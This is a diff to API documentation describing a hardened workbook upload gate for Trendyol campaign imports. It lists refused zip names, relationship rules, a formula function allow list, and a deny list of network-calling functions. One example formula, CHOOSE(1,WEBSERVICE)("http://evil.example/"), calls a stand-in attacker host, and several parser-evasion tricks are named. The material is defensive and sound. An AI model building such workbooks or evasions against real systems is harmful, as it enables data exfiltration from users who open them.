@@ -33,21 +33,39 @@ section "Versioning" for details.
   structures), or whose root relationships part (`_rels/.rels`) does not name `xl/workbook.xml` as
   its office document, answers `422` with `{ field: 'file', code: 'CORRUPT_FILE' }`. So does a
   workbook whose content types or relationships parts cannot be read whole: bytes that are not
-  UTF-8, a declaration of another encoding, no root element, or an element nested below a direct
-  child of the root. A workbook that declares a macro, an Excel 4.0 macro or international macro
+  UTF-8, a declaration of another encoding, no root element, an element nested below a direct
+  child of the root, or a `Relationship` or `Relationships` element (the root included) whose name
+  matches only when letter case is ignored (`relationship`, `RELATIONSHIPS`). So does a
+  relationship whose `TargetMode` is anything but exactly `Internal` or `External` (`external`,
+  `EXTERNAL`, `External ` with a trailing space), and a relationship `Id` in the relationships part
+  of a worksheet that holds a character reference, a tab or a line break; the root
+  relationships part also follows the UTF-8 text rule of every scanned part (a U+0000 character
+  anywhere, inside a comment included, is refused). So does an entry whose zip name is not a
+  canonical part name, checked on the names alone before anything is decompressed: every name
+  must be `[Content_Types].xml` or `/`-separated segments of the letters `A-Z` and `a-z`, the
+  digits and `.`, `_`, `~`, `-`, with no empty segment (no leading `/`, no `//`), no `.` or `..`
+  segment, no byte order mark in front of it, and a trailing `/` only on an empty folder entry. A
+  backslash, a percent escape, a space, a letter outside ASCII (a long s that folds to `s`) and
+  the interleaved pieces of ECMA-376 Part 2 (`name/[0].piece`, `name/[1].last.piece`, which a
+  packaging reader joins into one part) are all refused this way. So is a workbook in which any
+  XML part the gate keeps (not only the parts the reader opens), the root relationships part
+  included, does not decompress to the same bytes from the central directory with a second
+  decompressor as it did from the local headers (such as a stored deflate block whose two length
+  fields disagree). A workbook that declares a macro, an Excel 4.0 macro or international macro
   sheet, a dialog sheet, an embedded object, an ActiveX control, an external link, a data
   connection or a query table, found by its content type, its relationship type (in every
   relationships part, also those of parts not named `.xml`) or its part name, or that holds a
-  relationship whose `TargetMode` points outside the package (a linked picture, an OLE link;
-  hyperlinks excepted), answers `422` with `{ field: 'file', code: 'UNSAFE_CONTENT' }`. The six
+  relationship whose `TargetMode` points outside the package (a linked picture, an OLE link),
+  except a worksheet's hyperlink to an `http`, `https` or `mailto` address, answers `422` with
+  `{ field: 'file', code: 'UNSAFE_CONTENT' }`. The six
   export routes read the stored file through the same gate: a stored file with any of these
   conditions answers `409 CONFLICT`. Valid Trendyol files are unaffected.
 - **The campaign workbook upload gate checks cell styles, the sheet data, every formula field
   against an allow list, the parts it scans by their content, and relationship targets**
   (`POST /v1/organizations/{orgId}/stores/{storeId}/{commission-tariffs|plus-commission-tariffs|advantage-tariffs|flash-products|discount-lists|marketplace-campaigns}/import`).
   An upload whose read sheet has a cell, an empty one included, whose style index names no
-  `cellXfs` entry, or an `AlternateContent` element directly inside its sheet data or one of its
-  rows, answers `422` with `{ field: 'file', code: 'CORRUPT_FILE' }`. The gate now scans every zip
+  `cellXfs` entry, or an `AlternateContent` element anywhere inside its sheet data (in a row, in a
+  cell or deeper), answers `422` with `{ field: 'file', code: 'CORRUPT_FILE' }`. The gate now scans every zip
   entry whose content is XML, whatever its name (a worksheet stored as `.bin`, a VML drawing, a
   theme stored as `.dat`), not only the parts the reader opens. An entry that is not UTF-8 XML
   text (invalid UTF-8, a U+0000 character, a UTF-16 or UTF-32 byte order mark or layout, an
@@ -65,7 +83,9 @@ section "Versioning" for details.
   relationship of another type leaves the location checked as a formula. Any other element of the
   worksheet whose relationship id (an `id` attribute of any prefix) names such an external
   hyperlink, such as a sheet background `<picture r:id>`, answers `422` with
-  `{ field: 'file', code: 'UNSAFE_CONTENT' }`. A formula
+  `{ field: 'file', code: 'UNSAFE_CONTENT' }`. Both rules read the element's relationship id the
+  way an XML reader does: a tab, line feed or carriage return written in it counts for one space,
+  and so does a carriage return followed by a line feed. A formula
   may call only functions of a fixed allow list of pure math, text, logical, lookup and date
   functions (`IF`, `SUM`, `VLOOKUP`, `XLOOKUP`, `OFFSET`,
   `SEARCH` and similar); a call to any other function (`WEBSERVICE`, `HYPERLINK`, `IMAGE`, `RTD`,
@@ -80,9 +100,14 @@ section "Versioning" for details.
   path such as `\\host\share\Book2.xlsx!Name` or `C:\temp\[Book1.xlsx]Sheet1!A1`), a call of the
   result of an expression (a `(` right after `)`, `]` or `}`, as in
   `CHOOSE(1,WEBSERVICE)("http://evil.example/")`), a string literal, quoted sheet name or structured
-  reference that never closes, more than 32 768 characters, or anything but text (a comment,
+  reference that never closes, more than 32 768 characters, stored or in its NFKC compatibility
+  form (one character such as U+FDFA expands to eighteen), or anything but text (a comment,
   CDATA, a processing instruction or an element; the one child element Excel 2010+ writes in a
-  cross-sheet data validation or conditional format, `<xm:f>`, is read as the formula). A macro
+  cross-sheet data validation or conditional format, `<xm:f>`, is read as the formula). The
+  formula fields of all scanned parts of one upload together may hold at most 24 000 000 UTF-16
+  code units, each field counting its stored text plus its NFKC form (a real Trendyol export
+  holds at most about 70 000); beyond that the upload answers `422` with
+  `{ field: 'file', code: 'PAYLOAD_TOO_LARGE' }`. A macro
   assignment (a non-empty `macro` or `fmlaMacro` attribute, a non-empty `FmlaMacro` element), a
   VML control script (a `ScriptText` element holding anything but white space), an SVG or HTML
   `script`, `foreignObject`, `iframe`, `object` or `embed` element, an XML Events `handler` or
@@ -134,7 +159,10 @@ section "Versioning" for details.
   follow), answers `422` `UNSAFE_CONTENT`. A relationships part is recognised by its content as
   well as by its name: every scanned entry whose root element's local name is `Relationships`,
   whatever its namespace (one written with a character reference included), is checked by these
-  rules whatever it is named (`sheet1.xml.rel` with a long s, `sheet1.xml%2Erels`). A digital signature relationship (a signature origin, signature or
+  rules whatever it is named (`xl/media/image9.png`, say), and a root element named
+  `Relationships` only when letter case is ignored makes the part one too; names such as
+  `sheet1.xml.rel` with a long s or `sheet1.xml%2Erels` are refused earlier by the entry name rule
+  above. A digital signature relationship (a signature origin, signature or
   certificate) answers `422` `UNSAFE_CONTENT` too: verifying a signature can fetch the
   certificate's revocation and issuer addresses. The six export routes read the stored file through
   the same gate: a stored file with any of these conditions answers `409 CONFLICT`. Valid Trendyol
